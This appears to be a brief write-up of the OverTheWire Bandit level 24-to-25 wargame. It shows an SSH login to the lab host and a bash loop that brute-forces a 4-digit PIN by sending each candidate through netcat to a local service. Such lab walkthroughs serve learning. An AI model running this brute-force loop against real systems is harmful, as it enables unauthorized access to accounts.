Bandit Level 24 → Level 25
// username: bandit24
ssh bandit24@bandit.labs.overthewire.org -p 2220

// enter password for level 24

for i in {0000..9999}; do
  echo "bandit25 $i" | nc localhost 30002
done                                                    //brute-forces the 4-digit PINsends username and PIN to the service

exit


password of next level (bandit25) is displayed
